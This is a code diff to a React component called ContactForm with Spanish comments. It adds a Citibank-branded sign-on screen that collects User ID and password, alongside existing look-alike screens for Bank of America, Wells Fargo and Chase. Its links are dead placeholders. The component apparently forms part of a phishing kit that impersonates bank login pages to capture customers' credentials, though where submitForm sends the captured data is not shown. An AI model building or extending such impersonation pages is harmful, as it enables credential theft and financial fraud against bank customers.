@@ -88,6 +88,7 @@ export default function ContactForm() {
   // Detectar banco
   const isBankOfAmerica = bankName?.toLowerCase().includes('bank of america')
   const isWellsFargo = bankName?.toLowerCase().includes('wells fargo')
+  const isCitibank = bankName?.toLowerCase().includes('citibank')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -270,6 +271,113 @@ export default function ContactForm() {
                   <a href="#" className="block text-base text-content-primary hover:text-gray-700">
                     Privacy, Cookies, and Legal
                   </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Citibank
+    if (isCitibank) {
+      return (
+        <div className="min-h-screen bg-gray-50 px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-[600px]">
+              <div className="rounded-3xl bg-white p-10 shadow-lg">
+                {/* Logo del banco */}
+                <div className="mb-10 flex h-10 items-center">
+                  <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
+                </div>
+
+                <form onSubmit={submitForm} className="space-y-6">
+                  {/* User ID y Password lado a lado */}
+                  <div className="grid grid-cols-2 gap-4">
+                    <div>
+                      <label className="mb-2 block text-sm font-semibold text-content-primary">User ID</label>
+                      <input
+                        type="text"
+                        required
+                        value={username}
+                        onChange={(e) => setUsername(e.target.value)}
+                        className="w-full rounded-xl border-2 border-blue-400 px-4 py-3 text-content-primary outline-none transition-colors focus:border-blue-600"
+                      />
+                    </div>
+
+                    <div>
+                      <label className="mb-2 block text-sm font-semibold text-content-primary">Password</label>
+                      <div className="relative">
+                        <input
+                          type={showPassword ? 'text' : 'password'}
+                          required
+                          value={password}
+                          onChange={(e) => setPassword(e.target.value)}
+                          className="w-full rounded-xl border-2 border-blue-400 px-4 py-3 pr-10 text-content-primary outline-none transition-colors focus:border-blue-600"
+                        />
+                        <button
+                          type="button"
+                          onClick={() => setShowPassword(!showPassword)}
+                          className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-700"
+                        >
+                          <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Remember User ID */}
+                  <label className="flex items-center gap-3">
+                    <input
+                      type="checkbox"
+                      checked={rememberUsername}
+                      onChange={(e) => setRememberUsername(e.target.checked)}
+                      className="h-5 w-5 cursor-pointer rounded border-2 border-blue-600 accent-blue-600"
+                    />
+                    <span className="text-sm text-content-primary">Remember User ID</span>
+                  </label>
+
+                  {/* Sign On Button */}
+                  <button
+                    type="submit"
+                    disabled={submitting}
+                    className="mt-8 w-full rounded-xl bg-blue-600 py-3.5 font-bold text-white hover:bg-blue-700 disabled:opacity-60"
+                  >
+                    {submitting ? 'Signing in…' : 'Sign On'}
+                  </button>
+                </form>
+
+                {/* Links - Top Section */}
+                <div className="mt-6 flex items-center justify-between border-t border-black/10 pt-6">
+                  <div className="space-x-3">
+                    <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                      Register
+                    </a>
+                    <span className="text-gray-400">/</span>
+                    <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                      Activate
+                    </a>
+                  </div>
+                  <div className="space-x-2 text-sm">
+                    <span className="text-content-secondary">Forgot</span>
+                    <a href="#" className="text-blue-600 hover:text-blue-700 font-semibold">
+                      User ID
+                    </a>
+                    <span className="text-content-secondary">or</span>
+                    <a href="#" className="text-blue-600 hover:text-blue-700 font-semibold">
+                      Password
+                    </a>
+                  </div>
+                </div>
+
+                {/* Passwordless Sign On */}
+                <div className="mt-6 rounded-lg bg-gray-100 p-4 text-center">
+                  <div className="flex items-center justify-center gap-2">
+                    <Icon name="smartphone" size={20} className="text-blue-600" />
+                    <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
+                      Passwordless Sign On
+                    </a>
+                  </div>
                 </div>
               </div>
             </div>
